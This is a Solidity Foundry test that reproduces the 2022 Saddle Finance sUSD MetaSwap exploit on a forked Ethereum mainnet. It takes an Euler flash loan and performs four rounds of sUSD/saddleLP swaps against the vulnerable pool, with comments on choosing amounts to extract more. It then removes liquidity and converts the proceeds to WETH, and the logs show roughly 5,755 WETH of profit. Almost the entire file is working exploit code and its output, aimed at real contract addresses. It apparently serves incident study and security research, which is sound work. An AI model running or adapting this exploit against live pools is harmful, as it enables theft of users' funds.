// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @ https://phalcon.blocksec.com/explorer/tx/eth/0x2b023d65485c4bb68d781960c2196588d03b871dc9eb1c054f596b7ca6f7da56
// @ twitter:
//      - https://twitter.com/peckshield/status/1520364819244666880
//      - https://twitter.com/SlowMist_Team/status/1520444257538129921
// @ origin attack, exploit for WETH: 3375.672900685060401652
// @ exploit for WETH:                5755.193801746416710836
// Before attack, MetaSwap's sUSD: 8133884.478747092063607602
// After  attack, MetaSwap's sUSD:  448409.428708668303889353

contract ContractTest is Test {

    IERC20 public saddle_LP = IERC20(0x5f86558387293b6009d7896A61fcc86C17808D62); // vulnerable token
    IERC20 public usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // original funds for attack
    IERC20 public susd = IERC20(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51);
    IERC20 public dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IUSDT public usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IWETH public WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ISaddle public saddleLP_sUSD_Pool = ISaddle(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491); // vulnerable swap
    IEuler public eulerLoans = IEuler(0x07df2ad9878F8797B4055230bbAE5C808b8259b3); // Flashloan
    ISwapFlashLoan public swapFlashLoan = ISwapFlashLoan(0xaCb83E0633d6605c5001e2Ab59EF3C745547C8C7); // removeLiquidity
    ICurve public dai_usdc_usdt_Pool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7); // swap
    ICurve public dai_usdc_usdt_susd_Pool = ICurve(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD); // swap
    ICurve_uint256 public usdt_wbtc_weth_Pool = ICurve_uint256(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46); // swap

    function setUp() public {
        vm.createSelectFork("mainnet", 14_684_307 - 1);
    }

    function test_Exploit() public {

        // Flashloan for USDC, and attack in the callback
        // We do not change the flashloan amount for PoC
        eulerLoans.flashLoan(address(this), address(usdc), 15_000_000e6, "Go to the CallBack");
        
        // USDC => USDT = WETH
        usdc.approve(address(dai_usdc_usdt_Pool), type(uint256).max);
        dai_usdc_usdt_Pool.exchange(1, 2, usdc.balanceOf(address(this)), 0);
        usdt.approve(address(usdt_wbtc_weth_Pool), type(uint256).max);
        usdt_wbtc_weth_Pool.exchange(0, 2, usdt.balanceOf(address(this)), 0);

        emit log_named_decimal_uint(
            "After flashloan and swap USDC to WETH, exploit for WETH", WETH.balanceOf(address(this)), 18
        );
    }

    function attack() internal {
        // Swap: USDC => sUSD
        usdc.approve(address(dai_usdc_usdt_susd_Pool), type(uint256).max);
        dai_usdc_usdt_susd_Pool.exchange(1, 3, usdc.balanceOf(address(this)), 1);
        emit log_named_decimal_uint(
            "   Before attack, we have sUSD for preparation", susd.balanceOf(address(this)), 18
        );

        ////////////////////////  Begin Attack  ////////////////////////
        // [In the swap, I should find the best point of sUSD and saddleLP]
        //      1. Although I can get a lot of sasddleLP, I don't  do it.
        //      2. sUSD => WETH: more sUSD can get more WETH. But as the sUSD amount increases, 
        //          its rate of increase decreases because of the slippage.
        //         saddleLP => when the amount of saddleLP is larger, it cost more and more sUSD for swap.
        //      3. I calculate and then swap. Swap 4 times and exploit more saddleLP while sUSD is decrease. 
        //         I maintain some sUSD and get a number of saddleLP:
        //          some sUSD: swap to WETH.
        //          a number of saddleLP: removeLiquidity and get reward. Then swap them to WETH.
        //      4. I can not exploit `saddleLP_sUSD_Pool` again and again to get more and more sUSD until drain the pool,
        //         because of AMM. I exploit and get extra saddleLP while my sUSD indreases. In theory, due to loopholes, 
        //         it seems possible to exhaust the pool although it is AMM. But it is difficult to do that in a single transaction.

        console.log("       1st swap attack");
        swap_sUSD_to_saddleLP(susd.balanceOf(address(this)));
        swap_saddleLP_to_sUSD(saddle_LP.balanceOf(address(this)));

        console.log("       2nd swap attack");
        //                    16_860_043 * 10 ** susd.decimals()
        swap_sUSD_to_saddleLP(16_035_597 * 10 ** susd.decimals());
        swap_saddleLP_to_sUSD(saddle_LP.balanceOf(address(this)));

        console.log("       3rd swap attack");
        //                   22_515_594 * 10 ** susd.decimals()
        swap_sUSD_to_saddleLP(5_000_000 * 10 ** susd.decimals());

        console.log("       4th swap attack");
        //                    17_515_594 * 10 ** susd.decimals()
        swap_sUSD_to_saddleLP(10_000_000 * 10 ** susd.decimals());
        //                  9_682_799 * 10 ** saddle_LP.decimals()
        swap_saddleLP_to_sUSD(300_000 * 10 ** saddle_LP.decimals());
        ////////////////////////  After Attack  ////////////////////////

        ////////////////////////  Use saddle_LP to swap, get stablecoin ////////////////////////
        // removeLiquidity: saddle_LP => (dai, usdt, susd)
        saddle_LP.approve(address(swapFlashLoan), type(uint256).max);
        uint256[] memory minAmounts = new uint256[](3);
        minAmounts[0] = 0;
        minAmounts[1] = 0;
        minAmounts[2] = 0;
        swapFlashLoan.removeLiquidity(saddle_LP.balanceOf(address(this)), minAmounts, type(uint256).max);
        ////////////////////////  Use the saddle_LP to swap, get stablecoin ////////////////////////

        emit log_named_decimal_uint(
            "   After removeLiquidity, DAI", dai.balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "   After removeLiquidity, USDT", usdt.balanceOf(address(this)), 6
        );
        emit log_named_decimal_uint(
            "   After removeLiquidity, sUSD", susd.balanceOf(address(this)), 18
        );

        // Swap: (dai, susd) => USDC
        usdc.approve(address(dai_usdc_usdt_susd_Pool), type(uint256).max);
        dai.approve(address(dai_usdc_usdt_susd_Pool), type(uint256).max);
        usdt.approve(address(dai_usdc_usdt_susd_Pool), type(uint256).max);
        susd.approve(address(dai_usdc_usdt_susd_Pool), type(uint256).max);
        dai_usdc_usdt_susd_Pool.exchange(3, 1, susd.balanceOf(address(this)), 0); // sUSD => USDC
        dai_usdc_usdt_susd_Pool.exchange(0, 1, dai.balanceOf(address(this)), 0); // DAI => USDC
        // We don't do this, we can swap USDT to WETH directly later 
        // dai_usdc_usdt_susd_Pool.exchange(2, 1, usdt.balanceOf(address(this)), 0);  // USDT => USDC

        emit log_named_decimal_uint(
            "   After (dai, usdt, susd) => USDC, USDC balance", usdc.balanceOf(address(this)), 6
        );
    }

    function swap_sUSD_to_saddleLP(uint256 amount) internal {
        console.log("           attack swap: sUSD => saddleLP");
        emit log_named_decimal_uint(
            "               Before swap, sUSD", susd.balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "               Before swap, saddleLP", saddle_LP.balanceOf(address(this)), 18
        );

        //Swap: sUSD => saddleLP
        susd.approve(address(saddleLP_sUSD_Pool), amount);
        saddleLP_sUSD_Pool.swap(0, 1, amount, 0, block.timestamp);

        emit log_named_decimal_uint(
            "               After swap, sUSD", susd.balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "               After swap, saddleLP", saddle_LP.balanceOf(address(this)), 18
        );
    }

    function swap_saddleLP_to_sUSD(uint256 amount) internal {
        console.log("           attack swap: saddleLP => sUSD");
        emit log_named_decimal_uint(
            "               Before swap, sUSD", susd.balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "               Before swap, saddleLP", saddle_LP.balanceOf(address(this)), 18
        );

        //Swap: saddleLP => sUSD
        saddle_LP.approve(address(saddleLP_sUSD_Pool), amount);
        saddleLP_sUSD_Pool.swap(1, 0, amount, 0, block.timestamp);

        emit log_named_decimal_uint(
            "               After swap, sUSD", susd.balanceOf(address(this)), 18
        );
        emit log_named_decimal_uint(
            "               After swap, saddleLP", saddle_LP.balanceOf(address(this)), 18
        );

    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {

        emit log_named_decimal_uint(
            "Flashloan for USDC from Euler",usdc.balanceOf(address(this)), 6
        );
        attack();

        // Repay flashloan
        usdc.approve(msg.sender, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

/*
Logs:
  Flashloan for USDC from Euler: 15000000.000000
    Before attack, we have sUSD for preparation: 14800272.147571999524518901
        1st swap attack
            attack swap: sUSD => saddleLP
                Before swap, sUSD: 14800272.147571999524518901
                Before swap, saddleLP: 0.000000000000000000
                After swap, sUSD: 0.000000000000000000
                After swap, saddleLP: 9657586.884342671474923252
             attack swap: saddleLP => sUSD
                Before swap, sUSD: 0.000000000000000000
                Before swap, saddleLP: 9657586.884342671474923252
                After swap, sUSD: 16860043.913565513300299221
                After swap, saddleLP: 0.000000000000000000
        2nd swap attack
            attack swap: sUSD => saddleLP
                Before swap, sUSD: 16860043.913565513300299221
                Before swap, saddleLP: 0.000000000000000000
                After swap, sUSD: 824446.913565513300299221
                After swap, saddleLP: 9680391.493416514649194679
            attack swap: saddleLP => sUSD
                Before swap, sUSD: 824446.913565513300299221
                Before swap, saddleLP: 9680391.493416514649194679
                After swap, sUSD: 22515692.505672539010640150
                After swap, saddleLP: 0.000000000000000000
        3rd swap attack
            attack swap: sUSD => saddleLP
                Before swap, sUSD: 22515692.505672539010640150
                Before swap, saddleLP: 0.000000000000000000
                After swap, sUSD: 17515692.505672539010640150
                After swap, saddleLP: 5251748.813667662174989919
        4th swap attack
            attack swap: sUSD => saddleLP
                Before swap, sUSD: 17515692.505672539010640150
                Before swap, saddleLP: 5251748.813667662174989919
                After swap, sUSD: 7515692.505672539010640150
                After swap, saddleLP: 9682799.682739751536086877
            attack swap: saddleLP => sUSD
                Before swap, sUSD: 7515692.505672539010640150
                Before swap, saddleLP: 9682799.682739751536086877
                After swap, sUSD: 22485747.197610423284237150
                After swap, saddleLP: 9382799.682739751536086877
    After removeLiquidity, DAI: 3386729.757499026438687604
    After removeLiquidity, USDT: 2862586.521532
    After removeLiquidity, sUSD: 22485747.197610423284237150
    After (dai, usdt, susd) => USDC, USDC balance: 29191771.998509
  After flashloan and swap USDC to WETH, exploit for WETH: 5755.193801746416710836
*/